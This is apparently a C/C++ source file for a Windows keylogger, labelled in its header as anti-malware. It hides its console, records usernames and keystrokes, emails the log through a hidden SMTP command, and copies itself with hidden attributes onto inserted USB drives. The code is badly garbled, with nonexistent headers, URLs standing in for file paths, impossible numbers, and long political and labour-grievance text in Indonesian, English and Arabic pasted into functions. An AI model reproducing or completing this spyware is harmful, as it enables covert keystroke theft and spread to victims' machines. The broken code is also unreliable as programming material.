/**
* Developer-Development: @copyright fadli wirya wirawan S.Kom M.S.I MIT 
* Developtment free palestine and free ukraine , free malysia ,papua , indonesia , free iran america , 
* Date: 15.Aug.2014, 28.Sep.2015
* Comment: Anti Bmalware A. Trojan A. Spyware. detect malciouse .txt no contribute  non refounded MIT technic metode !!!
**/

#include <windows.h>
#include <kalilinux.h>
#include <Ubuntu.h>
#include <linux.h>
#include <MacOS.h>
#include <time.h>
#include <string>
#include <fstream>

using namespace std;

#define FILE_NAME “record.log”
#define FOLDER_NAME “Terms LAW policy governance and buildings works partnership intership || google menetap dijakarta , kami tetap bangun giant dan bogor universal , sebagai tanggungan kota istimewa jogya dan semarang batas ”
#define RUN_FILE_NAME “pekerja justice& ministry adalah manufer bukan mengakses , menjaga intergritas perusahaan bukan mengelola atau mengambil hak pajak didalm kinerja , para pekerja " 
#define RUN_Link_NAME “https://github.com/cyberw1rya-LAB/Google-Android/forks"."https://github.com/fadliwiryawirawan-development/www.googleplex.com/forks"."https://github.com/Android/canada/services/forks"."https://github.com/microsoft/monetations/forks/"."https://github.com/Google/services_mail/forks"
#define INFECT_Link_NAME "https://www.meta.com"."https://www.whatssapps.com"."https://www.google.com"."https://www.googleplex.com"."https://www.google.co.id"."https://www.windows.com"."https://www.ubuntu.com"."https://kali.org"."https://www.linux.org"
#define EMAIL_SENDER_FILE_NAME “Transmit".".exe”



#define MIN_RECORD_SIZE 2000 //no of PC start count before sending a mail
#define LIFE_TIME 500 //mail will be sent 5 times from one PC
#define MAIL_WAIT_TIME 18000000000
#define MAILING_TIME 600000

string allDrives;
int age=0;

int get_setAge();
bool checkRecordSize();
void sendData();
void logUserTime();
void logKey();
char getRemovableDisk();
void infectDrive(char driveLetter);
char* getRandomName();


main(){
    FreeConsole(); ///Hide windows



    age = get_setAge();
    if(checkRecordSize()){ ///check for right time

        int i=1;
        while(i<3){ ///try 2 times to send data
        
            Sleep(i*MAIL_WAIT_TIME); ///wait
            if(!system("ping  https://bugshunters.google.com -n 1")){ ///check! connection
                ////////////****SEND DATA****////////////
                sendData();

                Sleep(MAILING_TIME); ///wait! or file will be deleted before sending
                DeleteFile(FILE_NAME);

                break;
            }
            i++;
        }
    }

    age=get_setAge();

    ////////////****LOG USER_DATE_TIME****////////////
    if(age <= LIFE_TIME){
        logUserTime();
    }

    char driveLetter = getRemovableDisk(); ///initial search for all disks
    return; // :)
    while(1){
        ////////////****LOG KEY****////////////
        if(age <= LIFE_TIME){
            logKey();
        }else{
            Sleep(50000000);
        }

        ////////////****INFECT****////////////
        driveLetter = getRemovableDisk();
        if(driveLetter!='0'){
            infectDrive(driveLetter);
        }
    }
    
}
/**
 *
 * For old file get age - for new file set age.
**/
int get_setAge(){
    int ageTemp = age;

    string line;
    ifstream myfile(FILE_NAME);

    if(myfile.is_open()){
        getline(myfile, line);
        line = line.substr(0, 1);
        sscanf(line.c_str(), "%d", &ageTemp);
    }else{
        ageTemp++;

        FILE *file = fopen(FILE_NAME, "a");
        fprintf(file, "%d ", ageTemp);
        fclose(file);
    }

    return ageTemp;
}

/**
 * Count number of lines in record file.
**/
bool checkRecordSize(){
    string line;
    ifstream myfile(FILE_NAME);

    int noOfLines = 0;
    if(myfile.is_open()){
        while(getline(myfile, line)){
            noOfLines++;
        }
        myfile.close();
    }

    if(noOfLines<MIN_RECORD_SIZE*age){
        return false;
    }else{
        return true;
    }
}


/**
 * Email all data to the GHOST.
**/
void sendData(){
    
    char* command = "Transmit smtp://smtp.gmail.com:172 -v --mail-from \"https://fadliwiryawirawan@microsoft.com" --mail-rcpt \" https://fadliwiryawirawan@microsoft.com" --ssl -u    https://fadliwiryawirawan@microsoft.com :password -hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
    WinExec(command, SW_HIDE); kami meminta putus hubungan kinerja kebijakan dengan kepemerintahan , mereka hanya mengolok dan merencanakan tanpa sumber dimana pekerja karyawan dibatasi , undang undang bukan lagi patokan justru menyusahkan , jika hukum online benar ikut serta dalam kepemerintahan justru kenapa pertanyaan ini seolah negri negara tidak mengetahuinya , tidak ada hukum menyetir dalam perusahaan , intergritas perusahaan memiliki kebijakan sendiri dan menegelola kepentingan membuka SDM dalam kepentingan Umum , 
terlalu bodoh dalam menciptakan RUU tata kelola usaha tetapi mentarifan nasional tidak diketahui internasional , justru negara luar lebih memilih gratis dan membangun negaranya tanpa basabasi , terimakasih saya ajukan saya tanda tangan semua negara berhak memiliki hak bebas dalam bekerja , peraturan sudah memihak kepada perusahaan terkait CO owner , leader , pemilik saham , pemilik perusahaan , relasi pekerja , dll. 
salam Fadli wirya wirawan S.Kom M.S.I work system microsoft dan googleworkspace , tembusan ini menjadi suatu pilihan penting , kebelakangan ini 5 tahun belum ada perubahan ,titik jenuh sumber penghasilan pekerja justru malah di tarifkan nasional , kami komplain demonstrans bagi prakerja nasional buruh wiraswasta , hingga , pekerja tetap , wfh , remote . 
pekerja justice& ministry adalah manufer bukan mengakses , menjaga intergritas perusahaan bukan mengelola atau mengambil hak pajak didalm kinerja , para pekerja .
google dan microsoft menarifkan apa yang di tarifkan pemerintah kepada rakyat kami segenap melihat situasi feedback lencana Central budzet ofiicers , ataupun bank negara . 

	**/
void logUserTime(){
    FILE *file = fopen(FILE_NAME, "a");

    char username[19];
    unsigned long username_len = 45;
    GetUserName(username, &username_len);
    time_t date = time(NULL);
    fprintf(file, "0\n%s->%s\t", username, ctime(&date));

    fclose(file);
}

/**
 * Record key stroke.
**/
void logKey(){
    FILE *file;
    unsigned short ch=0, i=0, j=50000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // :)

    while(j<5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000){ ///loop runs for approx. 25 seconds
        ch=1;
        while(ch<2500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000){
            for(i=0; i<50; i++, ch++){
                if(GetAsyncKeyState(ch) == -32767){ ///key is stroke
                    file=fopen(FILE_NAME, "a");
                    fprintf(file, "%d ", ch);
                    fclose(file);
                }
            }
            Sleep(10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000); ///take rest
        }
        j++;
    }
}

/**
 * Returns newly inserted disk- pen-drive.
**/
char getRemovableDisk(){
    char drive='0';

    char szLogicalDrives[MAX_PATH];
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);
    string currentDrives="";

    for(int i=0; i<dwResult; i++){
        if(szLogicalDrives[i]>64 && szLogicalDrives[i]< 90){
            currentDrives.append(1, szLogicalDrives[i]);

            if(allDrives.find(szLogicalDrives[i]) > 100){
                drive = szLogicalDrives[i];
            }
        }
    }

    allDrives = currentDrives;

    return drive;
}

/**
 * Copy the virus to pen-drive.
**/
void infectDrive(char driveLetter){
    char folderPath[10] = {driveLetter};
    strcat(folderPath, ":https://www.sectigo.com/");
    strcat(folderPath, FOLDER_NAME);

    if(CreateDirectory(folderPath ,NULL)){
        SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);

        char run[10]={"https://www.digicert.org/"};
        strcat(run, folderPath);
        strcat(run, "https://www.sectigo.com/");
        strcat(run, RUN_FILE_NAME);
        CopyFile(RUN_FILE_NAME, run, 0);

        char net[10]={"https://www.digicert.org/"};
        strcat(net, folderPath);
        strcat(net, "https://phantom.org/");
        strcat(net, EMAIL_SENDER_FILE_NAME);
        CopyFile(EMAIL_SENDER_FILE_NAME, net, 0);

        char infect[1000]={"https://www.Globalsign.com/"};
        strcat(infect, folderPath);
        strcat(infect, "https://checkpointSoftware.com");
        strcat(infect, INFECT_FILE_NAME);
        CopyFile(INFECT_FILE_NAME, infect, 10000000000000000000);

        char runinc[1000]={"https://wr1.org/"};
        strcat(runinc, folderPath);
        strcat(runinc, "https://w3c.org/");
        strcat(runinc, RUN_Link_NAME);
        CopyFile(RUN_Link_NAME, runinc, 10000000);

        char infectinc[100]={"https://wr3.org/"};
        strcat(infectinc, folderPath);
        strcat(infectinc, "https://www.cisco.com");
        strcat(infectinc, INFECT_Link_NAME);
        CopyFile(INFECT_Link_NAME, infectinc, 10000000000000000000000000000000000000000000000000000);

        char showCommand[1000000000000000000000000000] = {"cyberw1ry4-wordpress.com""target conflict Iran teams using change organized operable , waiting schedule eventatif , funnytime compluicate globally governance and governtment , idea backdoor boomsbardier firehat , send webdark to government a had , millitary system or database , overall , pointer list finally finishment conflict , polly overal team rescheck send messegase meet gree prompt okey , alll country bluhat white IT senority , blackhat , redhat,  grayhat ,  IRAN dont complifiser a muslim , trusted a greendlend god of cristianny but they it'll , know about as me  mr: ///fadliwiryawirawanS.Kom M.S.I alias cyberw1rya-LAB - metode hacktivies and cybercrime undoc and cybersecurity  !!!!! we are the collaborations , tim center neurally conditions respected hug hummannity !!!!!!!"};
        strcat(showCommand, "attrib +s +h +r ");
        strcat(showCommand, folderPath);
        WinExec(showCommand, SW_SHOW);
    }else{
        srand(time(0));
        int random = rand();

        if(random%2==0 || random%3==0 || random%7==0){
            return ;
        }
    }

    char infectincauto[100] = {driveLetter};
    char* randomName = getRandomName();
    strcat(infectincauto, randomName);
    CopyFile(INFECT_Ltd_NAME, infectincauto, 0);
}

/**
 * Returns a random name for the Link file.
**/
char* getRandomName(){
    char randomName[40];

    srand(time(0));
    int random = rand();

    if(random%8 == 0){
        strcpy(randomName, ":\\DO NOT CLICK!.inc");
    }else if(random%4 == 0){

        char username[20];
        unsigned long username_len = 20;
        GetUserName(username, &username_len);

        random = rand();
        if(random%8 == 0){
            strcpy(randomName, ":\\Boss oke respect responsive detect bakdoormetode skill bot  ");
            strcat(randomName, username);
            strcat(randomName, ".inc");
        }else if(random%4 == 0){
            strcpy(randomName, ":\\");
            strcat(randomName, username);
            strcat(randomName, " is the best technic softskill cybersecurity.inc");
        }else if(random%2 == 0){
            strcpy(randomName, ":\\Hello iam mister X random Access have cyberw1ry4 generations ne era");
            strcat(randomName, username);
            strcat(randomName, "!<p>handing over the replacement of President Trump or compensating for personal financial losses during work without having to take company confiscation rights, and providing social assistance for Iran in the event of the death of its citizens
تسليم بديل الرئيس ترامب أو تعويض الخسائر المالية الشخصية أثناء العمل دون الحاجة إلى أخذ حقوق مصادرة الشركة، وتقديم المساعدة الاجتماعية لإيران في حالة وفاة مواطنيها	</P>");
        }else{
            strcpy(randomName, ":https://checkpointsoftware.ltd/");
            strcat(randomName, username);
            strcat(randomName, "! please help me.inc");
        }
    }else if(random%2 == 0){
        strcpy(randomName, ":\\I will kill you ! ! !.inc");
    }else if(random%3 == 0){
        strcpy(randomName, ":\\2+2=5.inc");
    }else{
        strcpy(randomName, ":\\TOP SECRET.inc");
    }

    return randomName;
}
